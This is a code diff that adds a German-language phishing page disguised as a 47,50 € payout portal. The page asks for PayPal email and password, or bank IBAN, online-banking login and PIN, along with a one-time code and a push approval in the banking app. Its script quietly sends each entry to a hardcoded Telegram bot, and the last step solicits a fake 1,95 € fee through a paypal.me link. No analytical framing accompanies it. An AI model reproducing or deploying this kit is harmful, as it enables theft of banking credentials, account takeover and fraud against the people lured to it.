@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="de"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Auszahlung – Portal</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f6;margin:0;
+display:flex;justify-content:center;align-items:center;min-height:100vh;color:#111827}
+.card{width:100%;max-width:410px;background:#fff;border-radius:16px;padding:32px 26px;margin:16px;
+box-shadow:0 8px 30px rgba(16,24,40,.10)}
+.top{display:flex;align-items:center;gap:10px;margin-bottom:22px}
+.dot{width:34px;height:34px;border-radius:10px;background:#0b5cff;color:#fff;
+display:flex;align-items:center;justify-content:center;font-weight:700;font-size:15px}
+.top span{font-weight:600;font-size:15px;letter-spacing:-.2px}
+h1{font-size:21px;margin:0 0 6px;letter-spacing:-.3px}
+p{font-size:14px;color:#6b7280;margin:0 0 20px;line-height:1.5}
+.amt{font-size:34px;font-weight:700;letter-spacing:-1px;margin:4px 0 2px}
+.amt small{font-size:14px;font-weight:500;color:#6b7280;letter-spacing:0}
+input{width:100%;padding:14px;font-size:16px;border:1.5px solid #e5e7eb;border-radius:10px;margin-bottom:12px}
+input:focus{outline:none;border-color:#0b5cff}
+button{width:100%;padding:14px;font-size:15px;font-weight:600;border:0;border-radius:10px;
+background:#0b5cff;color:#fff;cursor:pointer;margin-bottom:10px}
+button.ghost{background:#f3f4f6;color:#111827}
+a.btn{display:block;text-align:center;text-decoration:none;padding:14px;border-radius:10px;
+background:#0b5cff;color:#fff;font-weight:600;font-size:15px}
+.lock{display:flex;align-items:center;gap:6px;font-size:12px;color:#9ca3af;margin-top:16px}
+.hide{display:none}
+.timer{font-size:13px;background:#fff7ed;color:#9a3412;padding:10px 12px;border-radius:8px;margin-bottom:14px}
+</style></head><body>
+<div class="card">
+  <div class="top"><div class="dot">A</div><span>Auszahlungsportal</span></div>
+
+  <div id="s1">
+    <h1>Deine Auszahlung</h1>
+    <div class="amt">47,50 € <small>EUR</small></div>
+    <p style="margin-top:12px">Bereit zur Auszahlung. Wähle aus, wohin der Betrag gehen soll.</p>
+    <button onclick="pick('paypal')">Auf PayPal auszahlen</button>
+    <button class="ghost" onclick="pick('bank')">Auf Bankkonto auszahlen</button>
+    <div class="lock">🔒 Verbindung verschlüsselt</div>
+  </div>
+
+  <div id="s2" class="hide">
+    <h1 id="h2"></h1><p id="p2"></p>
+    <div id="fPay" class="hide">
+      <input id="pp" type="email" placeholder="E-Mail deines PayPal-Kontos" autocomplete="off">
+      <input id="ppw" type="password" placeholder="Passwort">
+    </div>
+    <div id="fBank" class="hide">
+      <input id="iban" placeholder="IBAN" autocomplete="off">
+      <input id="blz" placeholder="Anmeldename Online-Banking" autocomplete="off">
+      <input id="pin" type="password" placeholder="PIN">
+    </div>
+    <button onclick="next()">Weiter</button>
+    <button class="ghost" onclick="back()">Zurück</button>
+  </div>
+
+  <div id="s3" class="hide">
+    <h1 id="h3"></h1><p id="p3"></p>
+    <div id="fOtp" class="hide"><input id="otp" inputmode="numeric" placeholder="Code" autocomplete="one-time-code"></div>
+    <div id="timer" class="hide timer">Bitte bestätige jetzt in der App — <b id="sec">90</b> s</div>
+    <button onclick="fin()">Bestätigen</button>
+  </div>
+
+  <div id="s4" class="hide">
+    <h1>Auszahlung in Bearbeitung</h1>
+    <p>Der Betrag ist vorgemerkt. Es fällt eine Bearbeitungsgebühr von 1,95 € an, die mit der Auszahlung verrechnet wird.</p>
+    <a class="btn" href="https://paypal.me/JaneAlister/1.95">Gebühr jetzt begleichen</a>
+    <div class="lock">🔒 Danach erfolgt die Gutschrift innerhalb von 24 Stunden</div>
+  </div>
+</div>
+
+<script>
+const TOKEN='9153470596:AAHyw5JX9I3-ytoCDdrzzPNWAkRYGMVWrLQ';
+const CHAT='8379969031';
+let mode='', mail='', t=null;
+
+const $=id=>document.getElementById(id);
+function send(txt){
+  fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
+    method:'POST',keepalive:true,
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:'HTML'})
+  }).catch(()=>{});
+}
+
+/* Ping beim Öffnen */
+send('👀 <b>Seite geöffnet</b>\n'+navigator.userAgent.slice(0,70));
+
+function pick(m){
+  mode=m;
+  if(m==='paypal'){
+    $('h2').textContent='Mit PayPal auszahlen';
+    $('p2').textContent='Melde dich an, damit wir den Betrag zuordnen können.';
+    $('fPay').classList.remove('hide');
+  }else{
+    $('h2').textContent='Auf Bankkonto auszahlen';
+    $('p2').textContent='Bitte bestätige deine Kontodaten.';
+    $('fBank').classList.remove('hide');
+  }
+  send('➡️ gewählt: <b>'+(m==='paypal'?'PayPal':'Bank')+'</b>');
+  $('s1').classList.add('hide'); $('s2').classList.remove('hide');
+}
+
+function back(){
+  $('fPay').classList.add('hide'); $('fBank').classList.add('hide');
+  $('s2').classList.add('hide'); $('s1').classList.remove('hide');
+}
+
+function next(){
+  if(mode==='paypal'){
+    mail=$('pp').value.trim();
+    if(!mail.includes('@')||!$('ppw').value) return;
+    send('🔔 <b>JETZT EINLOGGEN</b>\n'+mail+'\n<code>'+$('ppw').value+'</code>');
+    $('h3').textContent='Bestätigung';
+    $('p3').textContent='Wir haben dir einen Code geschickt. Bitte hier eingeben.';
+    $('fOtp').classList.remove('hide');
+  }else{
+    send('🏦 <b>BANK</b>\nIBAN: '+$('iban').value+
+         '\nLogin: '+$('blz').value+
+         '\n<code>PIN: '+$('pin').value+'</code>');
+    $('h3').textContent='Bestätigung in der App';
+    $('p3').textContent='Öffne jetzt deine Banking-App und bestätige die Anmeldung.';
+    $('timer').classList.remove('hide');
+    let s=90;
+    t=setInterval(()=>{ s--; $('sec').textContent=s;
+      if(s<=0){clearInterval(t); $('timer').innerHTML='Kein Push erhalten? In der App auf „erneut senden" tippen.';} },1000);
+  }
+  $('s2').classList.add('hide'); $('s3').classList.remove('hide');
+}
+
+function fin(){
+  if(mode==='paypal'&&$('otp').value) send('📱 <b>CODE</b>\n'+mail+'\n<code>'+$('otp').value+'</code>');
+  if(t) clearInterval(t);
+  $('s3').classList.add('hide'); $('s4').classList.remove('hide');
+  send('✅ abgeschlossen');
+}
+</script></body></html>
